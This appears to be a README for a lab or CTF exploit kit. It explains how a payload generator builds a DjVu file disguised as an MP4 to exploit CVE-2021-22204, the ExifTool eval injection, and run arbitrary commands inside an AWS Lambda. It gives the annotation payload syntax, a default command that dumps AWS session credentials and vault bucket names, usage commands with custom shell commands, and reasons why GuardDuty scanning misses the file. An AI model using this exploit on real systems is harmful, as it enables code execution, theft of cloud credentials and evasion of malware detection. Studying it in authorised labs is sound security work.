# Payload Internals

## Overview

`generate_payload.py` creates a DjVu file saved as `malicious.mp4`.  
ExifTool determines file type from **content**, not from the file extension —  
so the DjVu magic bytes (`AT&TFORM`) cause ExifTool to parse the file as DjVu  
regardless of the `.mp4` suffix.

## Why This Works

### CVE-2021-22204 — ParseAnt() eval injection

ExifTool's `lib/Image/ExifTool/DjVu.pm` parses DjVu annotations in the  
`ParseAnt()` function. In versions < 12.24, the parsed annotation value is  
passed to Perl's `eval()` without sanitization:

```perl
# Vulnerable pattern in DjVu.pm 12.23 (simplified — actual code uses a reference: $$valPt = eval $$valPt)
$val = eval $val;   # untrusted input → arbitrary code execution
```

The annotation format is DjVu's S-expression syntax:

```
(metadata "\c${PERL_CODE};")
```

The `\c${}` sequence causes Perl to evaluate the embedded code block when  
the outer string is `eval`'d. This is the root of the vulnerability.

### ANTa vs ANTz

DjVu supports two annotation chunk types:
- `ANTz` — bzz-compressed annotations (commonly seen in PoCs)
- `ANTa` — uncompressed annotations (used here, no bzz required)

Both types are parsed by `ParseAnt()`. The `ANTa` approach avoids the need  
for the `bzz` compression tool, making the payload self-contained.

## File Structure

```
AT&TFORM [size] DJVU
  INFO [10 bytes]    — minimal page info (1×1 px, 100 dpi, version 26)
  ANTa [N bytes]     — annotation: (metadata "\c${system(q(CMD))};")
```

The `system(q(...))` Perl idiom wraps the shell command in Perl's `q()`  
quoting operator, avoiding quote conflicts inside the DjVu string literal.

## Default Payload

```bash
env | grep -E 'AWS_|VAULT_|UPLOADS_' > /tmp/exif_rce.txt
```

This writes all `AWS_*` and `VAULT_*` environment variables to a temp file.  
The Lambda handler reads `/tmp/exif_rce.txt` after ExifTool exits and includes  
the content as `debug_output` in the JSON response.

Expected captured variables inside Lambda:
| Variable | Contents |
|---|---|
| `AWS_ACCESS_KEY_ID` | Lambda execution role access key |
| `AWS_SECRET_ACCESS_KEY` | Lambda execution role secret |
| `AWS_SESSION_TOKEN` | Lambda execution role session token |
| `AWS_REGION` | `us-east-1` |
| `VAULT_BUCKET` | `beaversound-vault-<suffix>` |
| `UPLOADS_BUCKET` | `beaversound-uploads-<suffix>` |

## Customization

```bash
# Default: write credentials to /tmp/exif_rce.txt
python3 generate_payload.py --output malicious.mp4

# Show the raw annotation string
python3 generate_payload.py --show-annotation

# Custom command
python3 generate_payload.py --cmd "id > /tmp/exif_rce.txt" --output custom.mp4
```

## Why GuardDuty Does Not Detect This

GuardDuty Malware Protection for S3 scans uploaded objects against a  
signature database. This payload is **not detected** because:

1. **No known signature** — CVE-2021-22204 payloads are embedded Perl code  
   in DjVu annotation metadata. No AV/malware scanner has a signature for  
   arbitrary DjVu `ANTa` content.

2. **Valid file structure** — The file is a structurally valid DjVu document.  
   File format validation passes.

3. **Asynchronous scanning** — GuardDuty Malware Protection runs  
   **asynchronously** after the object is uploaded. It does not block the  
   S3 `PutObject` response or prevent the Lambda from being invoked.  
   Lambda executes long before the scan completes.

The GuardDuty scan result for this payload will be:  
`GuardDutyMalwareScanStatus: NO_THREATS_FOUND`
